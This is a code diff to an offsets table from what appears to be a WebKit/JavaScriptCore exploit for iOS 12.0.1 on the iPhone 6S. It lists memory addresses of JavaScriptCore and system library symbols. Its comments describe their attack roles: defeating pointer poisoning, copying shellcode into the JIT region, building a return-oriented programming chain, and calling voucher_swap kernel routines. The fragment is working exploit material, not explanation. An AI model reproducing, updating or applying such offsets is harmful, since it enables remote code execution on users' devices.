@@ -283,24 +283,30 @@ var Offsets = function Offsets(sw_vers, productname) {
     };
     
     offsets["iPhone 6S"][12.01] = {
-    	elvtable: 0x18887fb34,
-        vtable: 0x1B1C95058,
-        dlopen: 0x180923bb8,
-        confstr: 0x18096fa10,
-        disableprimitivegigacage: 0x1881cbf54,
-        g_gigacagebaseptrs: 0x1b80ec000,
-        g_typedarraypoisons: kOFFUnknown,
-        startfixedmempool: kOFFUnknown,
-        endfixedmempool: kOFFUnknown,
-        jit_writeseperateheaps_func: 0x1ba0610d0,
-        usefastpermissions_jitcopy: 0x1b80f0018,
-        ptr_stack_check_guard: 0x1b9fa9a18,
-        dlsym: 0x180923d64,
-        longjmp: 0x180adc598,
+    	nativejitcode: 0x18887fb34, 				// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
+        vtable: 0x1B1C95048, 						// HTMLDivElement vtable from JavaScriptCore
+        dlopen: 0x180923bb8, 						// From libdyld.dylib (For @5aelo's new mach-o approach)
+        confstr: 0x18096fa10, 						// From libsystem_c.dylib (For @5aelo's new mach-o approach)
+        disableprimitivegigacage: 0x1881CBF54, 		// From JavaScriptCore 
+        g_gigacagebaseptrs: 0x1B80EC000, 			// From JavaScriptCore 
+      	g_jsarraybufferpoison: 0x1B80F01A0, 		// From JavaScriptCore (For XOR with leaked buffer)
+      	g_jitcodepoison: 0x1B80F0190, 				// From JavaScriptCore (For XOR with leaked code)
+        g_typedarraypoisons: kOFFUnknown, 			// Removed as of iOS 11.4 
+        startfixedmempool: 0x1BA0610C0, 			// From JavaScriptCore (For copying shellcode)
+        endfixedmempool: 0x1BA0610C8, 				// From JavaScriptCore (For copying shellcode)
+        jit_writeseperateheaps_func: 0x1BA0610D0,	// From JavaScriptCore (For detecting < i8)
+        usefastpermissions_jitcopy: 0x1b80f0018,	// From JavaScriptCore (For detecting i8 and up)
+        ptr_stack_check_guard: 0x1b9fa9a18,			// To make our JITMemCpy work
+        dlsym: 0x180923d64,							// For our shellcode + linkage
+        longjmp: 0x180adc598,					
         callbacks: 0x1b80f01a8,
-        modelio_popx8: kOFFUnknown,
-        jscbase: 0x188174000,
-        linkcode_gadget: 0x188214890
+        modelio_popx8: kOFFUnknown,					// For our Return Oriented Programming chain
+        jscbase: 0x188174000,						// _TEXT segment of JavaScriptCore
+        linkcode_gadget: 0x188214890,				// From JavaScriptCore
+        dyld_shared_cache: 0x180000000,				// Just so we can parse any mach-o if we would want to or find gadgets
+        thread_swap_mach_voucher: 0x180A5F2D0,		// From libsystem_kernel.dylib (For voucher_swap)
+        task_set_mach_voucher: 0x180A5C0AC, 			// From libsystem_kernel.dylib (For voucher_swap)
+        task_get_mach_voucher: 0x180A5BF64			// From libsystem_kernel.dylib (For voucher_swap)
     };
     
     offsets["iPhone SE"][12.01] = {
